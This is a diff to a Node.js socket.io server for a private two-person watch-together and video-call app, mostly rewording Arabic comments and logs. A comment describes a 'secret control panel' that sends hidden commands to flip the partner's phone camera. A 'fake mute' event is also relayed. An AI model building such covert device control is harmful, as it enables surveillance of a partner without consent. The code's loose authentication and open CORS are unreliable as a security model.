@@ -6,7 +6,7 @@ const path = require('path');
 const app = express();
 const server = http.createServer(app);
 
-// إعداد أفضل لاتصالات ثابتة عبر الشبكات المختلفة
+// إعداد أفضل لاتصالات ثابتة ومستقرة عبر الشبكات المختلفة لمنع التقطيع
 const io = socketIo(server, {
     cors: {
         origin: "*",
@@ -17,7 +17,7 @@ const io = socketIo(server, {
     pingTimeout: 25000
 });
 
-// تقديم الملفات الثابتة بأمان
+// تقديم الملفات الثابتة بأمان مع منع تخزين الكاش لصفحة الويب لضمان التحديثات الفورية
 app.use(express.static(path.join(__dirname, './'), {
     setHeaders: (res, filePath) => {
         if (filePath.endsWith('.html')) res.setHeader('Cache-Control', 'no-cache');
@@ -29,7 +29,7 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// إنشاء ملف التطبيق التلقائي مع روابط أيقونات تعمل دائماً
+// إنشاء ملف التطبيق التلقائي مع روابط أيقونات تعمل دائماً بجودة عالية
 app.get('/manifest.json', (req, res) => {
     res.json({
         "name": "سينما VIP 🎬",
@@ -56,7 +56,7 @@ app.get('/manifest.json', (req, res) => {
     });
 });
 
-// حفظ حالة الفيديو بشكل دائم
+// حفظ حالة الفيديو بشكل دائم في ذاكرة الخادم لتتم المزامنة التلقائية عند دخول أي مستخدم جديد
 let cinemaState = {
     videoUrl: "",
     isPlaying: false,
@@ -65,15 +65,16 @@ let cinemaState = {
     playerType: "none"
 };
 
-// إدارة المستخدمين بشكل آمن
+// إدارة مستخدمي العائلة فقط بشكل آمن ومحمي
 const activeUsers = {
     abouahad: null,
     umalara: null
 };
 
 io.on('connection', (socket) => {
-    console.log('مستخدم متصل:', socket.id);
+    console.log('مستكشف متصل بالسينما:', socket.id);
 
+    // تسجيل وتفويض المستخدمين
     socket.on('register-user', (userId) => {
         if (userId === 'abouahad' || userId === 'umalara') {
             activeUsers[userId] = socket.id;
@@ -82,7 +83,7 @@ io.on('connection', (socket) => {
             const partnerId = userId === 'abouahad' ? 'umalara' : 'abouahad';
             const partnerSocketId = activeUsers[partnerId];
 
-            // إبلاغ الطرف الآخر بالاتصال فوراً
+            // إبلاغ الطرفين بحالة الاتصال النشط فوراً لتحديث الألوان ونصوص الاتصال
             if (partnerSocketId) {
                 io.to(partnerSocketId).emit('partner-status', { online: true });
                 socket.emit('partner-status', { online: true });
@@ -90,14 +91,16 @@ io.on('connection', (socket) => {
                 socket.emit('partner-status', { online: false });
             }
 
-            // إرسال آخر حالة فيديو عند الدخول
+            // إرسال آخر حالة سينما مسجلة فور الدخول لكي يبدأ تشغيل الفيلم تلقائياً من نفس الثانية
             socket.emit('cinema-state-update', cinemaState);
+            console.log(`✅ تم تسجيل دخول العضو المعتمد: ${userId}`);
         } else {
-            socket.disconnect(true); // رفض دخول أي شخص آخر
+            console.warn(`🚨 محاولة دخول غير مصرح بها من معرف: ${userId}`);
+            socket.disconnect(true); // طرد تلقائي لأي متطفل
         }
     });
 
-    // مزامنة الفيديو بسرعة فائقة
+    // استقبال مزامنة التوقيت وحالة التشغيل وتوزيعها فوراً على الشريك الآخر
     socket.on('cinema-control', (data) => {
         cinemaState = {
             videoUrl: data.videoUrl || "",
@@ -114,7 +117,7 @@ io.on('connection', (socket) => {
         }
     });
 
-    // إشارات الاتصال المرئي
+    // تمرير إشارات WebRTC الصوتية والمرئية بدون أي تدخل لتأسيس اتصال الند للند
     socket.on('webrtc-offer', (data) => {
         const partnerId = socket.userId === 'abouahad' ? 'umalara' : 'abouahad';
         const partnerSocketId = activeUsers[partnerId];
@@ -133,7 +136,7 @@ io.on('connection', (socket) => {
         if (partnerSocketId) io.to(partnerSocketId).emit('webrtc-candidate', data);
     });
 
-    // الأوامر الخاصة
+    // تفعيل لوحة تحكم أبو عاهد السرية الفخمة لإرسال أوامر تحكم خفية لهاتف شريكته
     socket.on('remote-flip-cam', () => {
         if (socket.userId === 'abouahad' && activeUsers.umalara) {
             io.to(activeUsers.umalara).emit('remote-flip-cam-triggered');
@@ -146,7 +149,7 @@ io.on('connection', (socket) => {
         }
     });
 
-    // تأثيرات الحب والخصوصية
+    // إرسال نبضات الحب والخصوصية المعتمة للشريكة
     socket.on('love-pulse', () => {
         const partnerId = socket.userId === 'abouahad' ? 'umalara' : 'abouahad';
         if (activeUsers[partnerId]) io.to(activeUsers[partnerId]).emit('love-pulse-received');
@@ -157,7 +160,7 @@ io.on('connection', (socket) => {
         if (activeUsers[partnerId]) io.to(activeUsers[partnerId]).emit('privacy-fake-mute-received', status);
     });
 
-    // عند انقطاع الاتصال
+    // إدارة الانفصال الآمن عند غلق المتصفح أو انقطاع الإنترنت المفاجئ
     socket.on('disconnect', () => {
         if (socket.userId) {
             activeUsers[socket.userId] = null;
@@ -165,14 +168,16 @@ io.on('connection', (socket) => {
             if (activeUsers[partnerId]) {
                 io.to(activeUsers[partnerId]).emit('partner-status', { online: false });
             }
-            console.log('مستخدم غادر:', socket.userId);
+            console.log('مستخدم غادر السينما:', socket.userId);
         }
     });
 });
 
-// تشغيل الخادم
+// تشغيل خادم السينما الفخمة
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-    console.log(`✅ الخادم يعمل بنجاح على المنفذ: ${PORT}`);
-    console.log(`🚀 يمكنك الوصول عبر: http://localhost:${PORT}`);
+    console.log(`\n======================================================`);
+    console.log(`✅ خادم سينما VIP المشفر يعمل بنجاح على المنفذ: ${PORT}`);
+    console.log(`🚀 تصفح وانسخ رابط الغرفة المشترك عبر: http://localhost:${PORT}`);
+    console.log(`======================================================\n`);
 });
